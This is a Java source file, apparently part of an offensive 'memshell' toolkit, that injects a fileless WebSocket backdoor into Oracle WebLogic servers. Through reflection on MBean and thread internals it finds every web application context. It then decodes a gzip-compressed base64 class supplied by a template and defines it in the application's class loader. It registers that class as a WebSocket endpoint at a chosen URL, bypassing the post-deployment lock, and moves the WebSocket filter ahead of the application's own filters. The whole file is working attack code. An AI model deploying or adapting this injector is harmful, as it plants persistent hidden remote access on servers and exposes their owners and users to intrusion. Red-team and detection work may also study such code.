package com.reajason.javaweb.memshell.injector.weblogic;

import javax.management.MBeanServer;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class WebLogicWebSocketInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public WebLogicWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    Object container = getServerContainer(context);
                    if (container == null) {
                        continue;
                    }
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, container, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * weblogic.servlet.internal.WebAppServletContext
     */
    @SuppressWarnings("unchecked")
    public static Set<Object> getContext() throws Exception {
        Set<Object> webappContexts = new HashSet<Object>();
        MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
        Map<String, Object> objectsByObjectName = (Map<String, Object>) getFieldValue(platformMBeanServer, "objectsByObjectName");
        for (Map.Entry<String, Object> entry : objectsByObjectName.entrySet()) {
            String key = entry.getKey();
            if (key.contains("Type=WebAppComponentRuntime")) {
                Object value = entry.getValue();
                Object managedResource = getFieldValue(value, "managedResource");
                if (managedResource != null && managedResource.getClass().getSimpleName().equals("WebAppRuntimeMBeanImpl")) {
                    webappContexts.add(getFieldValue(managedResource, "context"));
                }
            }
        }
        try {
            Object workEntry = getFieldValue(Thread.currentThread(), "workEntry");
            Object request = null;
            try {
                Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
                request = getFieldValue(connectionHandler, "request");
            } catch (Exception x) {
                // WebLogic 10.3.6
                request = workEntry;
            }
            if (request != null) {
                webappContexts.add(getFieldValue(request, "context"));
            }
        } catch (Throwable ignored) {
        }
        return webappContexts;
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "classLoader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    private Object getServerContainer(Object context) throws Exception {
        // WebLogic's WebAppServletContext implements javax.servlet.ServletContext directly
        Object container = invokeMethod(context, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(context, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        return container;
    }

    @SuppressWarnings("all")
    private void inject(Object context, Object container, Object obj) throws Exception {
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }

        // Use the standard static factory method — Tyrus (WebLogic) only exposes create(), not a (Class,String) constructor
        Object builder = invokeMethod(builderClass, "create", new Class[]{Class.class, String.class}, new Object[]{obj.getClass(), getUrlPattern()});
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        // JSR-356 addEndpoint() throws IllegalStateException once the app is active; Tyrus's own
        // register() bypasses this post-deployment lock and works on a live WebLogic server.
        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        try {
            invokeMethod(container, "register", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        } catch (Exception e) {
            invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        }
        try {
            prioritizeWebSocketFilter(context);
        } catch (Exception ignored) {
            // Newer WebLogic versions may use different filter internals and already order Tyrus first.
        }
    }

    /**
     * WebLogic 12 and 14 append Tyrus's filter after application filters. If one of those filters
     * does not support async processing, Tyrus cannot call startAsync() during the WebSocket
     * handshake. Move only the WebSocket mapping ahead of normal application mappings so the
     * upgrade is handled before a non-async filter can disable async support for the request.
     */
    @SuppressWarnings("all")
    private void prioritizeWebSocketFilter(Object context) throws Exception {
        Object filterManager = invokeMethod(context, "getFilterManager", null, null);
        Object value = getFieldValue(filterManager, "filterPatternList");
        if (!(value instanceof List)) {
            return;
        }
        List filterMappings = (List) value;
        synchronized (filterMappings) {
            for (int i = 0; i < filterMappings.size(); i++) {
                Object filterMapping = filterMappings.get(i);
                Object filterName = getFieldValue(filterMapping, "filterName");
                if ("WebSocket filter".equals(filterName)) {
                    if (i > 0) {
                        filterMappings.remove(i);
                        filterMappings.add(0, filterMapping);
                    }
                    return;
                }
            }
        }
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
